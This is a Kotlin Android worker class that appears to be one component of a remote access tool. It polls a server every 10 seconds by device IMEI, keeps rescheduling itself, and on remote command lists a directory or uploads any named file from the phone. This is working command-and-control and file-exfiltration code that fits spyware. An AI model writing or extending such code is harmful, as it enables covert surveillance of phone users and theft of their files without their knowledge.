package com.seuvillage.raptor.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager
import androidx.work.ExistingWorkPolicy
import androidx.work.Constraints
import androidx.work.NetworkType
import com.google.gson.Gson
import com.seuvillage.raptor.data.CommandResponse
import com.seuvillage.raptor.data.CommandStatusUpdate
import com.seuvillage.raptor.network.RetrofitClient
import java.net.SocketTimeoutException
import java.util.concurrent.TimeUnit

class CommandWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    private val TAG = "CommandWorker"
    private val gson = Gson()
    private val CHECK_INTERVAL_SECONDS = 10L // Intervalo de verificação: 10 segundos

    override suspend fun doWork(): Result {
        val imei = "TEST_IMEI_12345" // Use o IMEI real do dispositivo

        Log.d(TAG, "Consultando comandos pendentes para IMEI: $imei")

        try {
            val apiService = RetrofitClient.instance
            val response = apiService.getFileExplorerCommand(imei)

            if (response.isSuccessful) {
                val responseBodyString = response.body()?.let { gson.toJson(it) } ?: "null"
                Log.d(TAG, "Resposta bruta do servidor para comandos: $responseBodyString")

                val commandResponse = response.body()

                if (commandResponse != null) {
                    when (commandResponse.status) {
                        "success" -> {
                            val command = commandResponse.command
                            if (command != null && command.status == "pending") {
                                Log.d(TAG, "Comando pendente encontrado: ${command.command} (ID: ${command.id}) com dados: ${command.command_data}")

                                when (command.command) {
                                    "explore_files" -> {
                                        val path = command.command_data
                                        if (path != null) {
                                            Log.d(TAG, "Disparando FileExplorerWorker para o caminho: $path")
                                            val inputData = Data.Builder()
                                                .putString("path", path)
                                                .build()

                                            val fileExplorerWorkRequest = OneTimeWorkRequestBuilder<FileExplorerWorker>()
                                                .setInputData(inputData)
                                                .setInitialDelay(2, TimeUnit.SECONDS)
                                                .build()

                                            WorkManager.getInstance(applicationContext).enqueue(fileExplorerWorkRequest)
                                            updateCommandStatus(command.id, "executed")
                                            scheduleNextCheck()
                                            return Result.success()
                                        } else {
                                            Log.e(TAG, "Comando explore_files sem caminho especificado. ID do comando: ${command.id}")
                                            updateCommandStatus(command.id, "failed")
                                            scheduleNextCheck()
                                            return Result.failure()
                                        }
                                    }
                                    "upload_file" -> { // NOVO: Lógica para o comando de upload
                                        val filePathToUpload = command.command_data
                                        if (filePathToUpload != null) {
                                            Log.d(TAG, "Disparando UploadFileWorker para o arquivo: $filePathToUpload")
                                            val inputData = Data.Builder()
                                                .putString("imei", imei) // Passa o IMEI
                                                .putInt("command_id", command.id) // Passa o ID do comando
                                                .putString("file_path", filePathToUpload) // Passa o caminho do arquivo no dispositivo
                                                .build()

                                            val uploadFileWorkRequest = OneTimeWorkRequestBuilder<UploadFileWorker>()
                                                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                                                .setInputData(inputData)
                                                .setInitialDelay(2, TimeUnit.SECONDS)
                                                .build()

                                            WorkManager.getInstance(applicationContext).enqueue(uploadFileWorkRequest)
                                            // IMPORTANTE: Não marque o comando como 'executed' aqui.
                                            // O UploadFileWorker será responsável por atualizar o status para 'completed' ou 'failed'
                                            // após tentar o upload.
                                            Log.d(TAG, "Comando de upload agendado. Status será atualizado pelo UploadFileWorker.")
                                            scheduleNextCheck() // Agendada próxima verificação
                                            return Result.success() // O CommandWorker processou a solicitação de upload
                                        } else {
                                            Log.e(TAG, "Comando upload_file sem caminho especificado. ID do comando: ${command.id}")
                                            updateCommandStatus(command.id, "failed")
                                            scheduleNextCheck()
                                            return Result.failure()
                                        }
                                    }
                                    else -> {
                                        Log.w(TAG, "Comando desconhecido: ${command.command}. ID do comando: ${command.id}")
                                        updateCommandStatus(command.id, "failed")
                                        scheduleNextCheck()
                                        return Result.failure()
                                    }
                                }
                            } else {
                                Log.d(TAG, "Resposta 'success' mas sem comando válido, ou status não é 'pending'. Command: ${command?.command}, Status: ${command?.status}. ID: ${command?.id ?: "N/A"}")
                                scheduleNextCheck()
                                return Result.success()
                            }
                        }
                        "no_command" -> {
                            Log.d(TAG, "Nenhum comando pendente encontrado para IMEI: $imei")
                            scheduleNextCheck()
                            return Result.success()
                        }
                        else -> {
                            Log.w(TAG, "Resposta inesperada do servidor para comandos. Status: ${commandResponse.status} - Mensagem: ${commandResponse.message}")
                            scheduleNextCheck()
                            return Result.retry()
                        }
                    }
                } else {
                    Log.w(TAG, "Corpo da resposta de comandos vazio ou nulo.")
                    scheduleNextCheck()
                    return Result.retry()
                }
            } else {
                val errorBody = response.errorBody()?.string()
                Log.e(TAG, "Falha ao obter comandos. Código de resposta: ${response.code()}, Mensagem: ${response.message()}, Erro body: $errorBody")
                scheduleNextCheck()
                return Result.retry()
            }
        } catch (e: SocketTimeoutException) {
            Log.e(TAG, "Erro de timeout ao consultar comandos: ${e.message}", e)
            scheduleNextCheck()
            return Result.retry()
        } catch (e: Exception) {
            Log.e(TAG, "Exceção durante a execução do CommandWorker: ${e.message}", e)
            scheduleNextCheck()
            return Result.failure()
        }
    }

    private fun scheduleNextCheck() {
        val nextWorkRequest = OneTimeWorkRequestBuilder<CommandWorker>()
            .setInitialDelay(CHECK_INTERVAL_SECONDS, TimeUnit.SECONDS)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()

        WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "CommandWorker",
            ExistingWorkPolicy.REPLACE,
            nextWorkRequest
        )
        Log.d(TAG, "Próxima verificação do CommandWorker agendada para daqui a $CHECK_INTERVAL_SECONDS segundos.")
    }

    private suspend fun updateCommandStatus(commandId: Int, status: String) {
        try {
            val apiService = RetrofitClient.instance
            val statusUpdate = CommandStatusUpdate(commandId, status)
            val response = apiService.updateCommandStatus(statusUpdate)

            if (response.isSuccessful) {
                Log.d(TAG, "Status do comando $commandId atualizado para $status com sucesso.")
            } else {
                val errorBody = response.errorBody()?.string()
                Log.e(TAG, "Falha ao atualizar status do comando $commandId para $status. Código: ${response.code()}, Mensagem: ${response.message()}, Erro body: $errorBody")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exceção ao tentar atualizar status do comando $commandId: ${e.message}", e)
        }
    }
}
